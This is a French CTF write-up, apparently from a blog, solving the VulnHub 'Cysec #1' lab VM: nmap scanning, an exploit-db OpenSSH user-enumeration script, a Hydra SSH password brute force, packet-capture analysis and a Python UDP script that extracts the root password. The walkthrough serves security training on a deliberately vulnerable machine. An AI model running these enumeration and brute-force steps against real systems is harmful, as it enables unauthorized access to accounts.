---
title: "Solution du CTF Cysec #1 de VulnHub"
tags: [CTF,VulnHub]
---


Le CTF [Cysec #1](https://vulnhub.com/entry/cysec-1,524/) créé par *Ismael Al-safadi* était plutôt bon, mais la récupération du premier shell était laborieuse, d'abord parce que l'étape repose sur une vulnérabilité que l'on croise souvent sur les CTFs comme étant un faux positif (donc on a vite fait de l'ignorer). Ensuite l'exploitation de cette vulnérabilité prend un temps indécent puisqu'il fallait avoir recours à la wordlist `rockyou` pour parvenir à nos fins.

La mise en place de la VM a aussi été assez difficile. On ne dispose que d'un vmdk et ce dernier ne semble fonctionner correctement qu'avec VMWare.

## Gonna hack you lol

```
Nmap scan report for 192.168.242.133
Host is up (0.00040s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE    SERVICE VERSION
21/tcp  open     ftp     vsftpd 2.0.8 or later
22/tcp  open     ssh     OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp  open  http
111/tcp open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
```

On commence par l'énumération sur le serveur web.

On pense trouver quelque chose dans la page d'index :

```html
<html>
    <head>
        <title>Try to hack me , lol </title>
    </head>
    <body>
        <h1>Cysec 1 </h1>
        <p>Developed By : Ismael Al-safadi</p>
    </body>
<!-- bG9sIGJybyAsIHdoYXQgZG8geW91IHRoaW5rICEhIHJlYWxseSB5b3Ugc2VhcmNoaW5nIGZvciBzb21ldGhpbmcgaGVyZSAsIG5vb2I=  -->
</html>
```

Mais le base64 nous donne juste ce petit troll :

> lol bro , what do you think !! really you searching for something here , noob

J'ai énuméré longuement le serveur web à la recherche de fichiers et dossiers sans obtenir quoi que ce soit.

Le serveur FTP semble accepter des connexions sauf qu'une erreur nous bloque l'accès aux données :

```console
$ ftp 192.168.242.133
Connected to 192.168.242.133.
220 Welcome to cysec FTP service.
Name (192.168.242.133:devloop): anonymous
331 Please specify the password.
Password: 
500 OOPS: cannot change directory:/home/cysec
ftp: Login failed
```

On relève toutefois un nom d'utilisateur (`cysec`). Malheureusement, tenter de le brute forcer ne mène nul part.

## I'm not gonna enumerate you bro lol

Dans l'output Nmap (généré avec `--script vuln`) on voit la mention d'une vulnérabilité OpenSSH `SSH_ENUMUSERS`.

Cette vulnérabilité permet de vérifier l'existence d'utilisateurs sur le système via la vulnérabilité et en attaque force brute.

L'outil recommandé pour ce cas est Metasploit mais comme je ne l'avais pas dispo je me suis tourné vers les différents scripts Python disponibles sur `exploit-db`.

Il s'avère que les faire fonctionner n'est ni beau ni agréable. J'ai quand même réussit à faire fonctionner celui-ci qui permet de tester un utilisateur :

[OpenSSH &lt; 7.7 - User Enumeration (2) - Linux remote Exploit](https://www.exploit-db.com/exploits/45939)

Il aura fallu renommer les références à `_handler_table`  vers `_client_handler_table` pour corriger un changement lié à `paramiko`.

Je m'en suis aussi sorti avec la liste de versions suivante des dépendances :

```
bcrypt==3.1.7
cffi==1.15.1
cryptography==3.3.2
enum34==1.1.10
ipaddress==1.0.23
paramiko==2.12.0
pycparser==2.21
PyNaCl==1.4.0
six==1.16.0
```

Il fallait alors brute forcer la liste des utilisateurs, mais pas avec une wordlist adaptée : il fallait utiliser `rockyou` qui a plus d'intérêt pour casser des mots de passe.

Au vu du temps annoncé j'ai laissé tomber. Le compte à découvrir était `anonymouse` qu'on ne trouve effectivement pas dans les wordlists de noms d'utilisateurs.

```console
$ python 45939.py 192.168.242.133 nawak
/tmp/pyenv2/myvenv/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[-] nawak is an invalid username
$ python 45939.py 192.168.242.133 anonymouse
/tmp/pyenv2/myvenv/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] anonymouse is a valid username
```

## lil bro I'm gonna read your packets lol

```console
$ ssh anonymouse@192.168.242.133
anonymouse@192.168.242.133's password: 
[anonymouse@localhost ~]$ id
uid=1002(anonymouse) gid=1002(anonymouse) groupes=1002(anonymouse) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[anonymouse@localhost ~]$ ls -a
.  ..  .bash_logout  .bash_profile  .bashrc  .cache  .config  ICMPReq.PNG  .mozilla  readme.txt
[anonymouse@localhost ~]$ cat readme.txt
Hello dude , you doing good , i just need to insure that your network basics is good enough to get to the next leve 
so i prepared a simple challange for you .
You have this image which contains the hex dump of packet include ICMP , you have to get the Source IP(with normal ip format)  , 
type of ICMP(must be a number) and Destination Mac Address (in this format XX:XX:XX:XX:XX:XX) , then put the values in this format "DstMAC:TypeICMP:SrcIP" separated by ":" 
, finally you have to calculate the md5 hash for the this will be a web directory for the next step 
Your result must starts with (a8f.........)
```

Effectivement l'image `ICMPReq.PNG` correspond à une capture d'écran (vraisemblablement de Wireshark) où l'on voit un paquet ICMP.

![Capture ICMP](/assets/img/vulnhub/cysec1_icmp_req.png)

Afin d'avoir un élément de comparaison j'ai lancé une capture, fait un `ping -c 1 192.168.242.133` et observé comment était organisé mon paquet.

Au final :

- L'adresse MAC de destination correspond aux 6 premiers octets donc `d4:ca:6d:43:5a:90`

- Les 6 octets qui suivent sont l'adresse MAC d'origine

- Les 2 octets suivants spécifient le protocole réseau utilisé (`08 00` = ipv4)

- On a plus tard deux octets `08 00` et ils correspondent cette fois au type ICMP (ici 8 soit une requête ping ECHO)

- Les adresses IP source et destination sont placées juste avant, chacune sur 4 octets. Ici c'est `ac 12 46 d6` soit `172.18.70.214`

Passé à la moulinette, on obtient un hash qui commence bien par les caractères attendus.

```console
$ echo -n D4:CA:6D:43:5A:90:8:172.18.70.214 | md5sum 
a8f64cea84bc654f4769c483876c08e7
```

## I'm gonna show you my bash skillz lol

Le dossier en question sur le serveur web contient une liste d'images numérotées de 0 à 19 inclus.

Je peux les récupérer avec une boucle bash.

```bash
for i in $(seq 0 19); do wget -U Firefox -q http://192.168.242.133/a8f64cea84bc654f4769c483876c08e7/HoldOn$i.jpg; done
```

Toutes les images semblent se valoir de visu, mais l'une est différente :

```console
$ md5sum HoldOn*
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn0.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn10.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn11.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn12.jpg
1292ccdc1fb9739d6f4316dfb7aebb2f  HoldOn13.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn14.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn15.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn16.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn17.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn18.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn19.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn1.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn2.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn3.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn4.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn5.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn6.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn7.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn8.jpg
4bd0b52603265cb9c3c816dfecfdaa11  HoldOn9.jpg
$ strings HoldOn13.jpg | tail
1N>,
qVt}
4e#9UH
Z,:3u
R}j%
GO4z;
r+zJ
blhiv
4lAP2
Hey , Good job bro , take a look at dir /SuperSecretCys3c1
```

On trouve dans ce nouveau dossier un fichier `flag.bz2` qui est en réalité gzippé.

On a alors le classique *je décompresse, j'obtiens une archive, je décompresse, etc*.

Après un moment, j'ai un fichier avec du base64. Ce dernier se décode en du rot13 :

```
Z3VyIGhmcmVhbnpyIG5hcSBjbmZmamJlcSBndW5nIGxiaCBuZXIgeWJieHZhdCBzYmUgcmt2ZmdmIGJhIHF2ZSB0YTQ4M3RzaGFyZTk4dA==
```

Toujours avec bash uniquement :

```console
$ cat flag.txt  | base64 -d | tr 'n-za-mN-ZA-M' 'a-zA-Z'
the username and password that you are looking for exists on dir gn483gfuner98g
```

Dans ce dossier, on trouve un fichier qui contient une liste de mots de passe.

```
MMrft5445
EDrfio09k
RTHijji443
l78lkyjk6rh
TT88s*09
OO3879u8&^
MMT33gs*5
PPru78
hj4i5yh095i
```

## I'm gonna r00t you lil bro lol

Il y a deux utilisateurs sur le système :

```
cysec1:x:1000:1000:CySec:/home/cysec1:/bin/bash
cysec:x:1001:1001:cysec:/home/cysec:/bin/bash
```

Le second a son mot de passe dans la liste :

```console
$ hydra -l cysec -P passwordlist.txt ssh://192.168.242.133
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:1/p:9), ~1 try per task
[DATA] attacking ssh://192.168.242.133:22/
[22][ssh] host: 192.168.242.133   login: cysec   password: MMT33gs*5
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

On est visiblement reparti pour une analyse réseau :

```console
[cysec@localhost ~]$ ls
Desktop  Documents  Downloads  ftp  Music  Pictures  Public  Templates  use_scapy_with_your_attack_analyze_me_to_understand.pcapng  Videos
```

Ce `pcapng` contient différentes communications entre `192.168.78.138` et `192.168.78.1`.

Il y a notamment une conversation sur le port destination 5001 :

> hello John
> 
> hello Chris
> 
> im fine
> 
> perfect so i need you to send the secret key.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D.[D
> 
> ok
> 
> what is it ?
> 
> look at file answer.txt from this url http://192.168.78.1/answer.txt
> 
> ok
> 
> kkare you know how to use it ?
> 
>  no , tell me please
> 
> ok you have to send every word on the answer.txt file in UDP packet on port 8991 as payload , the correct one will return your flag
> 
> thanks your welcomewhat ? OK !!Bye

Plus tard dans la capture il y a la requête HTTP correspondante :

```http
GET /answer.txt HTTP/1.1
User-Agent: Wget/1.14 (linux-gnu)
Accept: */*
Host: 192.168.78.1
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 22:51:26 GMT
Server: Apache/2.4.27 (Win32) OpenSSL/1.0.2l PHP/7.0.22
Last-Modified: Tue, 21 Jul 2020 22:49:32 GMT
ETag: "16b-5aafb6fce9821"
Accept-Ranges: bytes
Content-Length: 363
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain

HUY65476jkru
6IJU56S$reWUhyw
i7&%iU%e^IUJ57
i6uy%$#YHG45y
879O&*^yOI76
y354YW$5$
i67iU%^&ui
u4y5y%$yt4
o678i76u67ir
53Y$%wuy%^UI%&I
o876IO&IUW$^UYW$6
75i%&EIUE%^U%E
&^I%&I4r5e
rehytryu
ytuRTUYRTUy
ryTURTUTYUI%
etuhyRJTYu
56iu56i57tyi5ujkdyt
tjuI&^UI46
u56ujryik7ti86rytujd
uj46rUJI^57%^&YUjsET^HUYf
iu65uj56ri756ijytjkit7ud
jtrsUIJ^%URDJ65
```

Le port 8991 mentionné dans le message ne semble pas en écoute sur le système mais il y en a un qui ressemble : 8889.

De toute façon, il suffit de les essayer :) J'ai écrit ce code Python qui envoie chaque ligne via un datagram UDP.

```python
import socket
from time import sleep

UDP_IP = "192.168.242.133"
UDP_PORT = 8889

with open("words.txt", "rb") as fd:
    for line in fd:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(line, (UDP_IP, UDP_PORT))
        sleep(.5)
```

J'observe alors que toutes les réponses UDP ont une taille de 11 sauf une :

> 879O&*^yOI76
> 
> root password is : I*TT55@7

On y est :

```console
[cysec@localhost ~]$ su root
Mot de passe : 
[root@localhost cysec]# id
uid=0(root) gid=0(root) groupes=0(root) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost cysec]# cd /root
[root@localhost ~]# ls
anaconda-ks.cfg  Congrats.txt  initial-setup-ks.cfg  myscript.sh  original-ks.cfg  udpserver  webserver
[root@localhost ~]# cat Congrats.txt
Finally you got it secret is : H%HheDZUr6i^I8uyS%4y$%wety^U^Y
```


